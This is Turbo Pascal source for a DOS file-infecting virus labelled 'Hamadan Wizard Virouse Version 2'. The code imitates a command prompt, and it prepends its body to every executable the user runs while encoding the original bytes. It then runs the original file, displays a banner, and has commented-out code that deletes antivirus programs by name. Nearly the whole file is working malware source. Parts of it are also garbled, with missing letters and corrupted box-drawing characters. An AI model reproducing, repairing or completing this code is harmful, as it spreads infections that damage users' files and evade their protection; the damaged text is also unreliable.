{ program write by khoshghadam and pc_group }
{$M $4000,0,0 }   { 16K stack, no heap }
program viros11;
uses crt,dos{,printer};
var
   path1,mand:String;
   path_vaz,serr,check1:string[6];
   file_search_1,file_new_virous:file of char;
   buffer_viros:array[1..20000] of char;
   teda_recor_viros:word;
   Drive1:DirStr;
   Name1:NameStr;
   Eextend1:ExtStr;
  y, m, d, dow : Word;
procedure parameter;
begin
path1:=paramstr(0);
FSplit(path1,Drive1,Name1,Eextend1);
  GetDate(y,d,m,dow);
end;
procedure search_meysam;
var read1,read2,read3,read4,read5,read6:char;
begin
{$I-}
   Assign(file_search_1,path1{path_vaseteh});
   Reset(file_search_1);
   {$I+}
   If ioresult <> 0 then begin path_vaz:='FFF';exit; end;
   If serr='true' then teda_recor_viros:=1;
  repeat
    Read(file_search_1,read1);
   If serr='true' then
     begin
        buffer_viros[teda_recor_viros]:=read1;
        teda_recor_viros:=teda_recor_viros+1;
     end;
    If read1='m' then
      begin
       Read(file_search_1,read2,read3,read4,read5,read6);
      If serr='true' then
      begin
         buffer_viros[teda_recor_viros]:=read2;
         teda_recor_viros:=teda_recor_viros+1;
         buffer_viros[teda_recor_viros]:=read3;
         teda_recor_viros:=teda_recor_viros+1;
         buffer_viros[teda_recor_viros]:=read4;
         teda_recor_viros:=teda_recor_viros+1;
         buffer_viros[teda_recor_viros]:=read5;
         teda_recor_viros:=teda_recor_viros+1;
         buffer_viros[teda_recor_viros]:=r ad6;
         teda_recor_viros =teda_recor_viros+1;
       en ;
       If (Ord(read1)=109) A D (Ord(read2)=69) AND (Ord(read )=89) AND
           (Ord(read )=83) AND (Ord(read5)=65) AND ( rd(read6)=109)
       then beg n path_vaz:='true';exit;end;
      end;
  until Eof(file_sear h_1);
   path_vaz:='false';
e d;
procedure chec_file;
var
   f1:file of char;
   DirInfo: SearchRec;
begin
 FindFirst(d ive1+'�', Archive,DirInfo);
 I   DosError = 0 then begin Assig (f1,drive1+'�');Erase(f1);end;  FindFirst(drive1+'��', Archive DirInfo);
 If  DosError = 0 th n begin Assign(f1,drive1+'��'); rase(f1);end;
end;
procedure  rite_virous;
var
   file_writ viros:file of Char;
   read_wi ouse1:char;
   i:word;
begin     Read(file_search_1,read_wir use1);
    Read(file_search_1, ead_wirouse1);
   Assign(file_ riteviros,drive1+'�');
   Rewr te(file_writeviros);
   while  OT eof(file_search_1) do
      begin
        Read(file_search 1,read_wirouse1);
        i:=o d(read_wirouse1);
        if i >0 then begin i:=i-1;Write(file writeviros,char(i));end
        else begin if i=0 then i:=255; rite(file_writeviros,char(i));e d;
      end;
   Close(file_s arch_1);
   Close(file_writevi os);
end;
procedure vorod_mes age;
begin
  Randomize;
     extColor(Random(15));
     Hig Video;
    Writeln('���������� ������������������������������� ������������������������������� ����');
    Writeln('��������� ������������������������������� ������������������������������� �����');
    Writeln('�������� ������������������������������� ������������������������������� ������');
    Writeln('������� ������������������������������� ������������������������������� �������');
    Writeln('������ �������Ŀ������Ŀ����������Ŀ�� ���Ŀ������Ŀ��������������Ŀ�� ��������');
    Writeln('����� ������������������������������� ������������������������������� ���������');
    Writeln('���� ����������ٰ�����������������Ŀ ������ٰ����������������������� ����������');
    Writeln('��� ������������������������������� �����Ŀ������������������������ �����������');
    Writeln('�� ��������������������ٰ��������� ٰ������İ������ٰ������ٰ����� ������������');
    Writeln('� ������������������������������� ������������������������������� �������������');
    Writeln(' ������������������������������� ������������������������������� ��������������');
    Writeln( ������������������������������� ������������������������������� ���������������');
    Writeln '������������������������������ ������������������������������� ����������������');
    Writel ('����������������������������� ������������������������������� �����������������');
    Write n('���������������������������� ������������������������������� ������������������');
    Writ ln('������Ĵ���Ŀ���������Ŀ��� ��������������������Ŀ��������� ����Ŀ������Ŀ�����');
    Wri eln('�������ٰ���ٰ����ٰ���ٰ� ������ٰ��ٰ�����ٰ���ٰ��ٰ��� ��������������ٰ����');
    Wr teln('������������������������� ������������������������������� ��ٰ�����������������');
    W iteln('������������������������ ����ٰ������������������������� ����������������������');
     riteln('����������������������� ������������������������������� �����������������������');
    Writeln('���������������������� ������������������������������� ������������������������');
    Writeln('��������������������� ������������������������������� �������������������������');
    Writeln('�������������������� ������������������������������� ��������������������������');
    Writeln('� HAMADAN � WIZARD   VIROUSE � VERSION 2 ���������� ���������������������������');     Writeln('������������������ ������������������������������� ����������������������������'); 
repeat
until Ord(Readkey)=13; 
TextColor(15);
LowVideo;
end 
{procedure printer1;
var
   b:boolean;
   Rg:Registers;
b gin
Rg.ah:=$2;
intr($17,rg); b:=(Rg.ah and $20)>0;
IF B=fal e THEN
begin
    Writeln(lst, ������������������������������� ������������������������������� ���������������');
    Writeln lst,'�������������������������������������������������������������������������������');
    Writeln(lst,'�������������������������������������������������������������������������������');
    Writeln(lst,'�������������������������������������������������������������������������������');
    Writeln(lst,'��������������Ŀ������Ŀ����������Ŀ������Ŀ������Ŀ��������������Ŀ�����������');
    Writeln(lst,'�������������������������������������������������������������������������������');
    Writeln(lst,'���������������ٰ�����������������Ŀ�������ٰ����������������������ٰ����������');
    Writeln(lst,'�����������������������������������������Ŀ������������������������������������');
    Writeln(lst,'�����������������������ٰ����������ٰ������İ������ٰ������ٰ������������������');
    Writeln(lst,'�������������������������������������������������������������������������������');
    Writeln(lst,'�������������������������������������������������������������������������������');
    Writeln(lst,'�������������������������������������������������������������������������������');
    Writeln(lst,'�������������������������������������������������������������������������������');
    Writeln(lst,'�������������������������������������������������������������������������������');
    Writeln(lst,'�������������������������������������������������������������������������������');
    Writeln(lst,'������Ĵ���Ŀ���������Ŀ������������������������Ŀ��������������Ŀ������Ŀ�����');
    Writeln(lst,'�������ٰ���ٰ����ٰ���ٰ��������ٰ��ٰ�����ٰ���ٰ��ٰ���ٰ�������������ٰ����');
    Writeln(lst,'�������������������������ٰ���������������������������������ٰ�����������������');
    Writeln(lst,'�����������������������������ٰ������������������������������������������������');
    Writeln(lst,'�������������������������������������������������������������������������������');
    Writeln(lst,'�������������������������������������������������������������������������������');
    Writeln(lst,'�������������������������������������������������������������������������������');
    Writeln(lst,'�������������������������������������������������������������������������������');
    Writeln(lst,'� HAMADAN � WIZARD � VIROUSE � VERSION 2 ��������������������������������������');
    Writeln(lst,'�������������������������������������������������������������������������������');
end;
end;}
procedure exec_program;
var f1:file of char;
a:String;
begin
Assign(f1,path1);{rename file asli to ss}
Rename(f1,drive1+'��');
Assign(f1,drive1+'�');{rename faile program to file}
 Rename(f1,path1);
{if m mod 2= 0 then printer1;}
Exec(path1,a);
Assign(f1,path1);{eraze faile program }
Erase(f1);
Assign(f1,drive1+'��');{rename faile ss to file asli}
Rename(f1,path1);
end;
procedure check;
var
  mand2,Serch1,ss2:String;
  DirInfo: SearchRec;
begin
mand2:=mand;
 FindFirst(mand2, Archive, DirInfo); { Same as DIR *.PAS }
 If  DosError = 0 then begin check1:='root';exit;end;
 Serch1:= FSearch(mand2,GetEnv('PATH'));
{ FSplit(Serch1, drive,name,Eextend);}
 If Serch1 <> '' then begin mand:=FExpand(Serch1);check1:='true';exit;end;
 check1:='false';
 mand2:=mand;
 mand2:=mand2+'.exe';
FindFirst(mand2, Archive, DirInfo); { Same as DIR *.PAS }
 If  DosError = 0 then begin mand:=mand2;check1:='root';exit;end;
 Serch1 := FSearch(mand2,GetEnv('PATH'));
{  FSplit(Serch1, drive,Name,Eextend);}
 If Serch1 <> '' then begin mand:=FExpand(Serch1);check1:='true';exit;end;
 mand2:=mand;
 mand2:=mand2+'.com';
FindFirst(mand2, Archive, DirInfo); { Same as DIR *.PAS }
 If  DosError = 0 then begin mand:=mand2;check1:='root';exit;end;
 Serch1 := FSearch(mand2,GetEnv('PATH'));
{  FSplit(Serch1,drive,Name,Eextend);}
 If Serch1 <> '' then begin mand:=FExpand(Serch1);check1:='true';exit;end;
end;
Procedure write_viros_in_the_new_file;
var
   j,i:word;
   file_new_virous,file_append,f1:file of char;
   charact:Char;
   DirInfo: SearchRec;
begin
  begin
     FindFirst(drive1+'���', Archive,DirInfo);
     If  DosError = 0 then begin Assign(f1,drive1+'���');Erase(f1);end;
  end;
Assign(file_new_virous,Drive1+'���');
Rewrite(file_new_virous);
   For j:=1 to teda_recor_viros do write(file_new_virous,buffer_viros[j]);
begin
Assign(file_append,mand);
Reset(file_append);
charact:=' ';
Write(file_new_virous,charact);
While NOT eof(file_append) do
   begin
      Read(file_append,charact);
      i:=ord(charact);
      i:=i+1;
      if i>255 then i:=0;
      write(file_new_virous,char(i));
   end;
end;
close(file_append);
close(file_new_virous);
End;
procedure command;
var
   Drive2:DirStr;
    Name2:NameStr;
 Eextend2:ExtStr;
(*var
   a,a2:string;
   i:word;
   j:word;*)
(*   var f:file of char;
   aq:string[100];*)
label L1,l2;
begin
  l1:Getdir(0,drive1);
  Write(drive1+'>');
  if length(drive1)<>3 then drive1:= drive1+'\';
   Readln(mand);
(* begin
  a:=mand;
  for i:=1 to length(a) do begin if a[i]='/' then j:=i end;
  if j<>0 then begin
    a2:=copy(a,j+1,length(a)-j+1);
  if a2='meysam' then
  begin
  delete(a,j,length(a)-j+1);
  writeln(a);
    end;
  end;
end;*)
check;
  If (check1='true') OR (check1='root') then
  begin
(*  FSplit(mand,drive1,name1,Eextend1);
if drive1='' then
begin
  Getdir(0,drive1);
  if length(drive1)<>3 then drive1:= drive1+'\';
end;
 if (name1+Eextend1='imenscan.exe') or
 (name1+Eextend1='imenscan.exe')or
 (name1+Eextend1='imengrd.exe') or
 (name1+Eextend1='toolkit.exe') then
  begin
  writeln(drive1+name1+Eextend1);
  aq:=drive1+name1+Eextend1;
  assign(f,aq);
  erase(f);
  end;*)
    serr:='false';
   path1:=mand;{path_vaseteh:=mand;}
search_meysam;
IF path_vaz<>'FFF' THEN Close(file_search_1);
IF path_vaz = 'FFF' THEN
begin writeln('Bad command Or file name');goto l2;end;
 FSplit(mand,drive2,name2,Eextend2);
 If drive2='' then drive2:=drive1;
 drive1:=drive2;name1:=name2;eextend2:=eextend1;
  If path_vaz<>'true' then{ virous after }
    begin
write_viros_in_the_new_file;
     Assign(file_new_virous,mand);
     Erase(file_new_virous);
     Assign(file_new_virous,Drive1+'���');
     Rename(file_new_virous,drive1+name1+eextend1);
    end
    ELSE if m mod 2= 0 then WRITELN(' virouse existing ');
  end;
  If mand='' then goto l1;
l2:If mand <> '' then
    mand := '/C ' + mand;
  SwapVectors;
  Exec(GetEnv('COMSPEC'), mand);
  SwapVectors;
  If DosError <> 0 then
    Writeln('Could not execute COMMAND.COM');
    goto l1;
end;
begin
  parameter;
   serr:='true';
  search_meysam;
  If path_vaz='true' then
   begin
      chec_file;
     write_virous;
if m mod 2= 0 then vorod_message;
     exec_program;
   end
   else begin Writeln('file dont file exec');close(file_search_1);end;
command;
end.
